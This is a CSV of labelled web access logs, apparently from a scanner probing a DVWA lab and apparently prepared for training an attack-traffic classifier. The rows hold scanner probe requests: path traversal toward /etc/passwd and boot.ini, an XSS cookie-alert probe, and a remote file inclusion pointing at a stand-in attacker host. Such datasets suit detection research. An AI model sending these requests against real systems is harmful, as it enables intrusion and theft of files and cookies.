ip,identity,user,timestamp,request,status,size,referer,user_agent,vulnerability,method,url,protocol,request_length,url_parts,user_agent_length,Predicted_Vulnerability
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/imprimer.asp?no=%60/etc/passwd%60|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;`&#039;. HTTP/1.1,400,483,-,-,Recon,GET,/DVWA/vulnerabilities/brute/imprimer.asp?no=%60/etc/passwd%60|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;`&#039;.,HTTP/1.1,178,7,1,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/imprimer.asp?no=....//....//....//....//....//....//....//etc.passwd|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1,400,483,-,-,Recon,GET,/DVWA/vulnerabilities/brute/imprimer.asp?no=....//....//....//....//....//....//....//etc.passwd|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.,HTTP/1.1,213,20,1,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/imprimer.asp?no=../../../../../../../../../etc/passwd%00|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1,400,483,-,-,Recon,GET,/DVWA/vulnerabilities/brute/imprimer.asp?no=../../../../../../../../../etc/passwd%00|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.,HTTP/1.1,201,16,1,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/imprimer.asp?no=/....../boot.ini|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1,400,483,-,-,Recon,GET,/DVWA/vulnerabilities/brute/imprimer.asp?no=/....../boot.ini|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.,HTTP/1.1,177,8,1,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/imprimer.asp?no=/.../.../.../.../.../.../boot.ini|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1,400,483,-,-,Recon,GET,/DVWA/vulnerabilities/brute/imprimer.asp?no=/.../.../.../.../.../.../boot.ini|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.,HTTP/1.1,194,13,1,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/imprimer.asp?no=/../../../../../../../../../../../../../../../../../../../../boot.ini|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1,400,483,-,-,Recon,GET,/DVWA/vulnerabilities/brute/imprimer.asp?no=/../../../../../../../../../../../../../../../../../../../../boot.ini|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.,HTTP/1.1,230,27,1,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/imprimer.asp?no=/../../../../../../../../etc/passwd|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1,400,483,-,-,Recon,GET,/DVWA/vulnerabilities/brute/imprimer.asp?no=/../../../../../../../../etc/passwd|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.,HTTP/1.1,196,16,1,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,"GET /DVWA/vulnerabilities/brute/imprimer.asp?no=/.\\\""./.\\\""./.\\\""./.\\\""./.\\\""./boot.ini|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1",400,483,-,-,Recon,GET,"/DVWA/vulnerabilities/brute/imprimer.asp?no=/.\\\""./.\\\""./.\\\""./.\\\""./.\\\""./boot.ini|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.",HTTP/1.1,205,12,1,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/imprimer.asp?no=/etc/passwd%00|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1,400,483,-,-,Recon,GET,/DVWA/vulnerabilities/brute/imprimer.asp?no=/etc/passwd%00|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.,HTTP/1.1,175,8,1,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/imprimer.asp?no=/etc/passwd|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1,400,483,-,-,Recon,GET,/DVWA/vulnerabilities/brute/imprimer.asp?no=/etc/passwd|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.,HTTP/1.1,172,8,1,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/imprimer.asp?no=c:\\boot.ini|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;c:&#039;. HTTP/1.1,400,483,-,-,Recon,GET,/DVWA/vulnerabilities/brute/imprimer.asp?no=c:\\boot.ini|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;c:&#039;.,HTTP/1.1,174,5,1,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/include/customize.php HTTP/1.1,404,490,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/include/customize.php,HTTP/1.1,62,6,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/include/help.php HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/include/help.php,HTTP/1.1,57,6,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/includes/footer.php3 HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/includes/footer.php3,HTTP/1.1,61,6,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/includes/header.php3 HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/includes/header.php3,HTTP/1.1,61,6,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/index.php?topic=&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;%20 HTTP/1.1,302,671,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/index.php?topic=&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;%20,HTTP/1.1,127,6,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/infos/contact/index.asp HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/infos/contact/index.asp,HTTP/1.1,64,7,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/infos/faq/index.asp HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/infos/faq/index.asp,HTTP/1.1,60,7,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/infos/gen/index.asp HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/infos/gen/index.asp,HTTP/1.1,60,7,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/infos/services/index.asp HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/infos/services/index.asp,HTTP/1.1,65,7,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/instaboard/index.cfm HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/instaboard/index.cfm,HTTP/1.1,61,6,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/intranet/browse.php HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/intranet/browse.php,HTTP/1.1,60,6,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/invitefriends.php3 HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/invitefriends.php3,HTTP/1.1,59,5,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/ipchat.php HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/ipchat.php,HTTP/1.1,51,5,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/ixmail_netattach.php HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/ixmail_netattach.php,HTTP/1.1,61,5,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/jsptest.jsp+ HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/jsptest.jsp+,HTTP/1.1,53,5,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/kernel/class/delete.php HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/kernel/class/delete.php,HTTP/1.1,64,7,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/kernel/classes/ezrole.php HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/kernel/classes/ezrole.php,HTTP/1.1,66,7,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/ldap.search.php3?ldap_serv=nonsense%20 HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/ldap.search.php3?ldap_serv=nonsense%20,HTTP/1.1,79,5,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/livredor/index.php HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/livredor/index.php,HTTP/1.1,59,6,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/login.php3?reason=chpass2%20 HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/login.php3?reason=chpass2%20,HTTP/1.1,69,5,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/mail/include.html HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/mail/include.html,HTTP/1.1,58,6,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/mail/settings.html HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/mail/settings.html,HTTP/1.1,59,6,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/mail/src/read_body.php HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/mail/src/read_body.php,HTTP/1.1,63,7,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/mailview.cgi?cmd=view&amp;fldrname=inbox&amp;select=1&amp;html=../../../../../../etc/passwd HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/mailview.cgi?cmd=view&amp;fldrname=inbox&amp;select=1&amp;html=../../../../../../etc/passwd,HTTP/1.1,132,12,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/mambo/banners.php HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/mambo/banners.php,HTTP/1.1,58,6,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/manage/login.asp+ HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/manage/login.asp+,HTTP/1.1,58,6,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/mantis/summary_graph_functions.php?g_jpgraph_path=http%3A%2F%2Fattackershost%2Flistings.txt%3F HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/mantis/summary_graph_functions.php?g_jpgraph_path=http%3A%2F%2Fattackershost%2Flistings.txt%3F,HTTP/1.1,135,6,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/members/ID.pm HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/members/ID.pm,HTTP/1.1,54,6,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/members/ID.xbb HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/members/ID.xbb,HTTP/1.1,55,6,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/mod.php HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/mod.php,HTTP/1.1,48,5,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/modif/delete.php HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modif/delete.php,HTTP/1.1,57,6,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/modif/ident.php HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modif/ident.php,HTTP/1.1,56,6,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/modif_infos.asp?n=%60/etc/passwd%60 HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modif_infos.asp?n=%60/etc/passwd%60,HTTP/1.1,76,7,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/modif_infos.asp?n=....//....//....//....//....//....//....//etc.passwd HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modif_infos.asp?n=....//....//....//....//....//....//....//etc.passwd,HTTP/1.1,111,19,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/modif_infos.asp?n=../../../../../../../../../etc/passwd%00 HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modif_infos.asp?n=../../../../../../../../../etc/passwd%00,HTTP/1.1,99,15,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/modif_infos.asp?n=/....../boot.ini HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modif_infos.asp?n=/....../boot.ini,HTTP/1.1,75,7,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/modif_infos.asp?n=/.../.../.../.../.../.../boot.ini HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modif_infos.asp?n=/.../.../.../.../.../.../boot.ini,HTTP/1.1,92,12,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/modif_infos.asp?n=/../../../../../../../../../../../../../../../../../../../../boot.ini HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modif_infos.asp?n=/../../../../../../../../../../../../../../../../../../../../boot.ini,HTTP/1.1,128,26,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/modif_infos.asp?n=/../../../../../../../../../etc/passwd HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modif_infos.asp?n=/../../../../../../../../../etc/passwd,HTTP/1.1,97,16,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,"GET /DVWA/vulnerabilities/brute/modif_infos.asp?n=/.\\\""./.\\\""./.\\\""./.\\\""./.\\\""./boot.ini HTTP/1.1",404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,"/DVWA/vulnerabilities/brute/modif_infos.asp?n=/.\\\""./.\\\""./.\\\""./.\\\""./.\\\""./boot.ini",HTTP/1.1,103,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/modif_infos.asp?n=/etc/passwd HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modif_infos.asp?n=/etc/passwd,HTTP/1.1,70,7,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/modif_infos.asp?n=/etc/passwd%00 HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modif_infos.asp?n=/etc/passwd%00,HTTP/1.1,73,7,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/modif_infos.asp?n=c:\\boot.ini HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modif_infos.asp?n=c:\\boot.ini,HTTP/1.1,71,5,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/modules/Downloads/voteinclude.php+ HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/Downloads/voteinclude.php+,HTTP/1.1,75,7,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/modules/Forums/attachment.php HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/Forums/attachment.php,HTTP/1.1,70,7,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/modules/Search/index.php HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/Search/index.php,HTTP/1.1,65,7,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/modules/WebChat/in.php+ HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/WebChat/in.php+,HTTP/1.1,64,7,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/modules/WebChat/out.php HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/WebChat/out.php,HTTP/1.1,64,7,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/modules/WebChat/quit.php HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/WebChat/quit.php,HTTP/1.1,65,7,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/modules/WebChat/users.php HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/WebChat/users.php,HTTP/1.1,66,7,115,Recon
